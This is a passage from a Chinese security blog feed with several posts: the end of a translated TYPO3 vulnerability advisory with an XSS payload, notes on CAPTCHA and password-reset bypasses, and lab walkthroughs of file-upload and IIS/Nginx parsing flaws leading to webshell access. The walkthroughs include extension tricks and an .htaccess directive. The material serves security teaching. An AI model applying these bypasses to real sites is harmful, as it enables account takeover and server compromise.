$result[&apos;databaseRow&apos;][$result[&apos;processedTca&apos;][&apos;ctrl&apos;]</span><br><span class="line">        [&apos;transOrigDiffSourceField&apos;]]);</span><br></pre></td></tr></table></figure></p><p>这里是有关如何通过工具链expoit PHP对象注入的更多信息的链接： （<a href="https://blog.ripstech.com/2018/php-object-injection）" target="_blank" rel="noopener">https://blog.ripstech.com/2018/php-object-injection）</a></p><h2 id="0x04-CVE-2019-12748：在后端的存储型XSS"><a href="#0x04-CVE-2019-12748：在后端的存储型XSS" class="headerlink" title="0x04 CVE-2019-12748：在后端的存储型XSS"></a>0x04 CVE-2019-12748：在后端的存储型XSS</h2><p>CMS TYPO3的后端中存在跨站脚本漏洞（CVE-2019-12748）。有权访问Site Redirects部分的非特权用户可以利用t3://伪协议注入一个恶意的URL。<br><code>t3://url/?url=javascript:alert(1);</code><br>通过添加这个特定的站点，可以重定向另一个拥有更高权限的TYPO3用户，从而诱使他们点击触发恶意JavaScript的链接。攻击者可以将此漏洞作为启动远程代码执行漏洞攻击的支点。</p><p>TYPO3会阻止用户利用链接和URL中危险的javascript:伪协议，这意味着TYPO3将直接执行JavaScript。但是，它并不阻止用户利用TYPO3的内置t3://伪协议，该协议实现了多种功能，例如引用TYPO3内部页面，文件，邮件地址或URLs。实际上，指定一个自动转换为可点击链接的URL将绕过TYPO3的白名单，该白名单最初的作用是阻止javascript:伪协议。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文所述的漏洞会对具有一个或多个TYPO3后端的用户的TYPO3系统产生严重的影响。经过身份验证并且可以访问Pages部分的后端用户可以在底层远程系统上执行代码。攻击者可以利用Site Redirects模块中的跨站脚本漏洞作为利用此漏洞的支点。</p><h2 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h2><p>2019年5月9日：提交漏洞<br>2019年5月9日：漏洞确认<br>2019年5月10日：与厂商安全负责人协调解决问题<br>2019年6月6日：厂商通知6月25号发布补丁<br>2019年6月25日：TYPO3 9.5.8补丁发布</p><h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><p>WordPress 5.1 CSRF to Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-csrf-to-rce</a></p><p>Magento 2.3.1: Unauthenticated Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/magento-rce-via-xss" target="_blank" rel="noopener">https://blog.ripstech.com/2019/magento-rce-via-xss</a></p><p>MyBB &lt;= 1.8.20: From Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/mybb-stored-xss-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/mybb-stored-xss-to-rce</a></p><p>WordPress 5.0.0 Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution</a></p><p>CTF Writeup: Complex Drupal POP Chain：</p><p><a href="https://blog.ripstech.com/2019/complex-drupal-pop-chain" target="_blank" rel="noopener">https://blog.ripstech.com/2019/complex-drupal-pop-chain</a></p><p>本文翻译自 blog.ripstech.com， 原文链接 。如若转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>验证码绕过、密码找回漏洞</title>
      <link href="/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用"></a>验证码作用</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><p>可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。</p><p>由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p><p>验证码的种类很多，有滑块验证，纯数字验证，点击字符，数字运算等……<br>而我们能有效的利用验证码防止恶意破解密码、刷票、论坛灌水、刷页。</p><h2 id="验证码常见的绕过姿势"><a href="#验证码常见的绕过姿势" class="headerlink" title="验证码常见的绕过姿势"></a>验证码常见的绕过姿势</h2><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><ul><li>造成原因：找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期。</li><li>测试方法：通过枚举找到真正的验证码输入验证码完成验证。</li></ul><p>###验证码重复使用<br>验证码可以多次重复，如果现在的验证码为1106，如果登录失了，验证码会换但是输入1106，还是判定验证码正确；<a href="http://www.anquan.us/static/bugs/wooyun-2016-0169672.html" target="_blank" rel="noopener">案例</a></p><h3 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h3><ul><li>造成原因：在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。</li><li>测试方法：使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。<h3 id="前端验证验证码"><a href="#前端验证验证码" class="headerlink" title="前端验证验证码"></a>前端验证验证码</h3></li><li>造成原因：只在前端进行验证没有进行后端验证</li><li>测试方法：直接抓包进行跑数据包，反正没验证码的阻碍。<h3 id="修改密码处id可替换"><a href="#修改密码处id可替换" class="headerlink" title="修改密码处id可替换"></a>修改密码处id可替换</h3></li><li>造成原因：修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句：update user set  password=”qwer1234” where id = ‘1’修改数据包里的id的值，即可修改他人密码。</li><li>测试方法：修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。<h3 id="验证码无校验"><a href="#验证码无校验" class="headerlink" title="验证码无校验"></a>验证码无校验</h3></li><li>造成原因：设置了验证码，但却没有校验(真是扯淡……估计开发会被老板砍死)</li><li>测试方法：乱输验证码进行验证即可。<h3 id="验证码空值绕过"><a href="#验证码空值绕过" class="headerlink" title="验证码空值绕过"></a>验证码空值绕过</h3></li><li>造成原因：没对验证码参数进行强制条件，如我们发现登录参数是user=admin&amp;psw=123456&amp;yzm=1312，将验证码传参去掉，留下user=admin&amp;psw=123456就可以绕过验证码机制。</li><li>测试方法：抓包，如看到类似验证码参数，将其去掉，进行发包。<h3 id="验证码可控制"><a href="#验证码可控制" class="headerlink" title="验证码可控制"></a>验证码可控制</h3></li><li>造成原因：有时候验证码通过url传参，就是说我们参数可控，而验证码是通过参数设定的。</li><li>测试方法：直接将参数设置成固定，那么可能验证码就不会变</li></ul><p><strong>绕过姿势有很多种，这里只是给大家介绍几种，能帮助更好的了解此漏洞。</strong></p><h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><p>有一类验证码，他并不是区分用户是计算机还是人的公共全自动程序，它是用来证明你的身份，比如你登入微信，支付宝，支持短信验证登入，像这类验证码实际上是用来区分你的身份的。<br>当你qq密码忘记密码时候，你需要找回密码，然后他要求把APP现实的动态密码填入框内，一般而言手机验证码都由5-30分钟，如果他没有做尝试限制的话我们是不是可以进行穷举？然后直接跑出验证码就能修改他人的密码？</p><p>第一种就是找回密码，往邮箱发送明文或密码后者验证码(手机短信验证就是玩你的手机发送验证码)通过这样的方式来判断是否是本人</p><p>第二种发送一个重置密码的链接到你的绑定邮箱去，点击则重置密码；</p><h3 id="密码找回漏洞例子"><a href="#密码找回漏洞例子" class="headerlink" title="密码找回漏洞例子"></a>密码找回漏洞例子</h3><ul><li>验证码发送后前端返回<a href="http://www.anquan.us/static/bugs/wooyun-2016-0172266.html" target="_blank" rel="noopener">安利</a></li><li>验证码无次数限制可爆破</li><li>验证码可控<a href="http://www.anquan.us/static/bugs/wooyun-2014-086716.html" target="_blank" rel="noopener">安利</a></li><li>直接修改密码页面<a href="http://www.anquan.us/static/bugs/wooyun-2013-040908.html" target="_blank" rel="noopener">安利</a></li><li>缺失身份——&gt;绑定别人的手机号到自己的手机<a href="http://www.anquan.us/static/bugs/wooyun-2013-016896.html" target="_blank" rel="noopener">安利</a></li><li>越权漏洞——&gt;自己验证码通过改包然后修改他们密码</li></ul><h2 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbn3k3ewj31h80q37gc.jpg" alt><br>我们看到这是一个后台管理页面，在这里我们可以看到有一个密码找回，他是通过管理员邮箱来找回的，我们可以通过社工和社区寻找管理员的邮箱。</p><p>在这里我们已经找到邮箱了<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbne7ztuj30ir09ddfu.jpg" alt></p><p>我们通过审计代码发现认证码是在10-10000的随机数，那如果它没有输入认证码次数限制，那我们可不可以通过爆破来爆出认证码。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3si8n7bwqj30t30i1jxq.jpg" alt><br>我们通过burp抓包<br>进行爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbo8p3hxj31gz0q9ah4.jpg" alt></p><p>成功爆破出认证码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbp05856j30kz09jabl.jpg" alt></p><p>我们进行登录<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg" alt="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg"><br>发现登录成功</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞——解析、验证、伪造（三）</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/</url>
      
        <content type="html"><![CDATA[<p><strong>接上一篇内容</strong></p><h2 id="IIS6-0解析漏洞（一）"><a href="#IIS6-0解析漏洞（一）" class="headerlink" title="IIS6.0解析漏洞（一）"></a>IIS6.0解析漏洞（一）</h2><p>我们现在要讲的第一个是IIS6.0的解析问题：</p><p>iis6.0除了将ASP后缀当成ASP进行解析的同时，当<strong>文件后缀名字为.asa .cer .cdx也会当做asp去解析</strong>，而严格意思上讲这可以说是iis6的一些特性，只是iis6默认的一些默认配置，文件后缀名字为.asa .cer .cdx之所以也会当做asp去解析，是因为<strong>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll。</strong></p><p>当然，如果我们在iis6.0应用程序扩展配置中添加.allblue调用asp.dll可执行文件路径，那么我们也可以通过.allblue后缀来当成asp文件来解析；</p><p>接下来我们来看靶场：<br><img src="https://s2.ax1x.com/2019/05/23/VPPBQO.png" alt><br>这道题，我们只要通过上传一张图片马，并抓包将后缀改成.asa .cer .cdx其中一种后缀，都会被当成asp文件执行(请注意，我们要解析的是asp文件,所以一句话也要是asp的；也不能再本地直接改后缀名，因为这里会验证文件的文件类型)</p><p>我们将图片马上传并抓包改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bco51gejj30z40rkjup.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcotohhjj30z40rkwhz.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcp8pj9rj30kn06zmx7.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpms01qj31hc05374x.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpzllsuj30zk0jgq4o.jpg" alt></p><h2 id="IIS6-0解析漏洞（二）"><a href="#IIS6-0解析漏洞（二）" class="headerlink" title="IIS6.0解析漏洞（二）"></a>IIS6.0解析漏洞（二）</h2><p>首先说明下,IIS5和IIS7.5无此漏洞！</p><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞，这一解析漏洞有两种完全不同的利用方式：</p><p>test.asp;.jpg 会被当做asp进行解析<br>text.asp/123.jpg 会被当做asp进行解析</p><p>假如我们请求/aaa.asp;xxxx.jpg<br> 执行过程：</p><ol><li><p>从头部查找查找“.”,获得.asp;xxxx.jpg</p></li><li><p>查找“;”号，如果有则内存截断</p></li><li><p>查找“/”号，如果有则内存截断</p></li></ol><p><strong>最终，将保留下来.asp字符串，从META_SCRIPT_MAP脚本映射表里于扩展名匹配对比，并反馈给asp.dll</strong><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdy4uguij31320m9tbi.jpg" alt><br>我们先上传图片马<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdyhs8kfj30z40rkgoy.jpg" alt><br>并改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdysx2crj30z40rkq6a.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdz1tirij30d903nmx2.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzav54yj31h80600td.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzl1189j30zk0jgwgd.jpg" alt></p><h2 id="IIS6-0解析漏洞（三）"><a href="#IIS6-0解析漏洞（三）" class="headerlink" title="IIS6.0解析漏洞（三）"></a>IIS6.0解析漏洞（三）</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj36uy6oj312t0nigog.jpg" alt><br>IIS6.0还有一个漏洞，在后缀是.asp的文件夹下，里面的文件里只要有asp代码，只要进行访问，都会当做asp文件执行；<br>我们先上传图片看看目录：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj3yblsnj31hb09ewet.jpg" alt><br>我发现他的文件是存放在.asp后缀文件夹下，那我们是不是可以上传一张图片马上去直接来当成asp文件执行呢？我们试下</p><p>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjbs3411j31f106nt8q.jpg" alt><br>访问成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bje86116j31h204mt9b.jpg" alt></p><p>直接用菜刀连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjepq8mqj30zk0jg75h.jpg" alt></p><h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjhl75i1j312z0ms0vg.jpg" alt><br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设SCRIPT_FILENAME.</p><p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP</a> CGI，如果开启了fix_pathinfo选项，name就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME(绝对路径)是phpinfo.jpg,而1.php是PATH_INFO,所以就会phpinfo.jpg作为php文件来解析了</p><p>这也是一个逻辑问题，所以说<strong>我们只需要在正常的jpg后面加/.php就可以成功的绕过解析</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞-解析、验证、伪造</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p><p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p><h1 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><h1 id="文件上传漏洞的原因："><a href="#文件上传漏洞的原因：" class="headerlink" title="文件上传漏洞的原因："></a>文件上传漏洞的原因：</h1><ul><li>文件上传时检查不严。没有进行文件格式检查。</li><li>文件上传后修改文件名时处理不当。一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</li></ul><h1 id="文件上传常见检测："><a href="#文件上传常见检测：" class="headerlink" title="文件上传常见检测："></a>文件上传常见检测：</h1><h3 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h3><p>一般都是在网页上写一段js脚本，通过js去检测上传文件的后缀名，有白名单形式也有黑名单形式。</p><p><strong>判断方式</strong>：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。前端验证非常不可靠，通过修改数据包后缀名就可以绕过，甚至关闭js都可以尝试绕过。</p><h3 id="2-服务端检测"><a href="#2-服务端检测" class="headerlink" title="2.服务端检测"></a>2.服务端检测</h3><p>检查content-type(内容类型)</p><p>检查后缀(多为检查后缀)</p><p>检查文件头</p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><p><strong>我们通过upload-labs这个靶场实践来进一步认识文件上传漏洞：</strong></p><h2 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h2><p>发现有一个上传点:<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/3Mmx5VPtCeDOVajrGQdlsIyRqbXkdDVByTBpXwvgJdA!/b/dE8BAAAAAAAA&amp;bo=JAWAAn4HpQMDCVA!&amp;rf=viewer_4" alt></p><p>我们试着上传一个带一句话的php上去，并开启burp抓包：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/l.JY9E.mj4AfwMwYb5Dctfcfw9EOUQbMT0Z.zi4J4go!/b/dL8AAAAAAAAA&amp;bo=ZQaAAnwGiQIDGSw!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/uTXBzs2Ps5cWXXSqyuT6tJycypL.Z6kJ*kCngBftG6s!/b/dDUBAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt><br>发现被拦截下来，提示只能上传图片类型，而在burp上并无抓取到任何数据，这证明就是一个典型的客户端前端检测</p><p>我们通过将php文件改成jpg文件使其符合检测要求，再在抓取数据包时将文件后缀改回php，从而完成绕过：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/TTZRCftxc3JNuulzU7WceTsyeEqqCQOokzNoepwq*XA!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt></p><p>发现成功上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*EDL2ABep5jCTnuEtx3hbs3zd7SZRFPJR3GKoldj5xc!/b/dLYAAAAAAAAA&amp;bo=gAcyAoAHMgIDGTw!&amp;rf=viewer_4" alt></p><p>通过连接菜刀或直接调用一句话函数都可以实现了getshell；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/4TFYbPyRNP5*fBz2AFQw*IZxJcvcViw.uVEx9OrYYt8!/b/dIMAAAAAAAAA&amp;bo=XQfVA10H1QMDGTw!&amp;rf=viewer_4" alt></p><h2 id="2-Content-Type方式绕过"><a href="#2-Content-Type方式绕过" class="headerlink" title="2.Content-Type方式绕过"></a>2.Content-Type方式绕过</h2><p>分析源码，知道了是对Content-Type(内容类型)和文件头的检测，<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/k7Q*x9fqgWz5dGtJqOsWKzPvTT0idkTpvc1k9nKHPLs!/b/dLgAAAAAAAAA&amp;bo=BgWAAmUHrgMRGWA!&amp;rf=viewer_4" alt></p><p>那我们想到的是就是图片马，图片马是可以很好的绕过内容类型和文件头检测的，在这里我准备好了一个写了一句话的txt文件和一张小图片来合成一张图片马：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/gz4TwdZE01nQdK7U6tdbyqa9xidrPgWSev6j8jC5.jM!/b/dFMBAAAAAAAA&amp;bo=zADaAMwA2gARGS4!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/OJ0mpZH4z1GBmvVyPYgtUiengE6r*78DPKn.ynq4WTc!/b/dMUAAAAAAAAA&amp;bo=nQI*AZ0CPwERGS4!&amp;rf=viewer_4" alt><br>成功生成图片马，然后我们将图片马上传并抓包将后缀改为php，因为web容器是根据后缀去解析不同的文件的，所以我们将他改成php<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/dUa5qe571hvX4y8kSTfD*rEs.jxaziSx8mmE0Yo.9sI!/b/dIQAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt><br>最后成功上传，并调用一句话<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/8Temr59hWbfKnh6OUyr0dRh3UCato6TZFcWnUChSbHM!/b/dL8AAAAAAAAA&amp;bo=MQWAAmgHkQMRGWU!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZO3Z5LqU7MPUKOuIRhqiYTwnCmkpNEaHxm1U*T3d1.o!/b/dDQBAAAAAAAA&amp;bo=dAfXA3QH1wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><p>查看源码<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/Nb6czO9WTB4*L6e6mQuqQ7Agi.ex2aNHMb*tv6W2SgM!/b/dLYAAAAAAAAA&amp;bo=ZQW9AmUFvQIRCT4!&amp;rf=viewer_4" alt><br>发现是一个黑名单绕过，它拦截了.asp,.aspx,.php,.jsp后缀的文件，但他拦截了php，是不是就意味着我们就不能上传php文件了呢？其实不是的，在默认状态下<strong>php，php3，php4，php5，phtml</strong>是会被解析成php的，请看下图<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ekwZbyk2edL5EupB09P8Jmdsc2QvPzfargMfRfWj03U!/b/dMAAAAAAAAAA&amp;bo=LgGkAC4BpAARCT4!&amp;rf=viewer_4" alt><br>我们将图片马后缀改成php3，成功将上传，调用一句话，最后成功调用，证明是可以php3是可以被php解析的；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/ER3vfEB2o6Cz20fHXHQSnQVYaezJOBDlDhVPMMSlH4o!/b/dL8AAAAAAAAA&amp;bo=ewfSA3sH0gMRGS4!&amp;rf=viewer_4" alt></p><h2 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h2><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/mEWjMDZU2Q7YDuklJEEfcKIcukqlBjU8U*FNNsBltTw!/b/dDIBAAAAAAAA&amp;bo=VAXJAlQFyQIRGS4!&amp;rf=viewer_4" alt><br>.htaccess是什么？.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或者多个指令的文件，以作用于此目录及其所有子目录。<br>.htaccess功能：<br>文件密码保护，用户自定义重定向，自定义404页面，扩展名伪静态化，禁止特定ip地址的用户，但这个功能默认是不开启的。</p><p>.htaccess中有一条指令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>这个指令代表着.jpg文件会当做php来解析。</p><p>只要我们把带有这条指令的.htaccess配置文件上传上去到有黑名单拦截的上传点，那就意味着我们就能将图片马直接上传上去了！</p><p>图形化界面是不允许我们将文件命名为空文件名 .htaccess，所以这里通过cmd命令来进行重命名：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*Z8xWXTZLwkgcga9IhymWx*oWoG6MnmR9M.DajlIFl8!/b/dE0BAAAAAAAA&amp;bo=WwTQAlsE0AIRGS4!&amp;rf=viewer_4" alt><br>成功命名，<br>我们接下来，只需要先将.htaccess配置文件先传上去，在将图片马传上去即可；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/QjmHLIRy7nOP*i6x2BoPnYS58mG3WipMkEMJnsztUyk!/b/dLYAAAAAAAAA&amp;bo=gAfcA4AH3AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="5-后缀大小写绕过"><a href="#5-后缀大小写绕过" class="headerlink" title="5.后缀大小写绕过"></a>5.后缀大小写绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/NsiHDYDfN.Hj.9yD1bRwXVg.UMyHnH6x.WU0p0PPKtY!/b/dFMBAAAAAAAA&amp;bo=YAXIAmAFyAIRCT4!&amp;rf=viewer_4" alt></p><p>在这里，虽然使用了很多过滤，过滤了很多文件类型，但却没将文件后缀统一转化为小写，所以我们是能通过后缀大小写来绕过上传的：</p><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/yOlNuyZEw.zicCi8Edmbs5BKc1fH.HnwoPjmqQwes4Q!/b/dFMBAAAAAAAA&amp;bo=ZwCCAGcAggARGS4!&amp;rf=viewer_4" alt></p><p>我们将做成图片马直接将后缀改成Php，进行上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRGS4!&amp;rf=viewer_4" alt></p><h2 id="6-文件后缀（空）绕过"><a href="#6-文件后缀（空）绕过" class="headerlink" title="6.文件后缀（空）绕过"></a>6.文件后缀（空）绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ctpzNLW1hvfPIv.T4z0Dkrsak5SyY67FtTJu8nlEkzQ!/b/dDQBAAAAAAAA&amp;bo=ZwXFAmcFxQIRCT4!&amp;rf=viewer_4" alt></p><p>这里相对于前面关卡的代码是少了一个消除两旁空格的函数trim();所以我们我们可以通过在后缀加个空格尝试绕过，<strong>黑名单机制中，是不允许上传什么，但如果我们传上去的文件与所限制的稍有不一样，那是不是就可以直接绕过黑名单了</strong></p><p>我们进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/d*pCj2unPGzQ7rMhKzo8QEfPa7tBLtExl229Qs*79HE!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p>在后缀加个空格，上传</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRCT4!&amp;rf=viewer_4" alt></p><h2 id="7-文件后缀-点-绕过"><a href="#7-文件后缀-点-绕过" class="headerlink" title="7.文件后缀(点)绕过"></a>7.文件后缀(点)绕过</h2><p><img 